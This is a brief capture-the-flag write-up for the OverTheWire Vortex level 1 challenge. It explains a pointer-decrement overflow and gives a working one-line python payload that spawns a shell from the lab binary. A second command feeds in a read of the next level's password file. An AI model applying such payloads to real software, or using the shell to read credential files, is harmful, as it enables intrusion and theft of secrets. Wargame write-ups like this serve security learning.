Title: overthewire, vortex: level 1
Date: 2011/10/07 23:55
Author: Ken Ko
Tags: overthewire.org, buffer overflow

The code:

[codebox 1]


So normally we want to overflow in a positive direction, but here we have a pointer value that we want to manipulate which is allocated <em>after</em> our overflow buffer. Good thing the switch gives us a way to decrement that pointer, eh?

Since ptr is in the middle of the 512 size buffer, let's give this a try:

<code>
vortex1@games /vortex $ python -c 'print "\\" * 257 + "\xca!"' | /vortex/level1
sh-3.2$ exit
vortex1@games /vortex $
</code>

However, because that doesn't give us a legit shell, let's pass in the cat request along with the exploit. 


<code>
cat <(python -c 'print "\\" * 257 + "\xca!"') <(echo cat /etc/vortex_pass/vortex2) | /vortex/level1
</code>

Awesome.
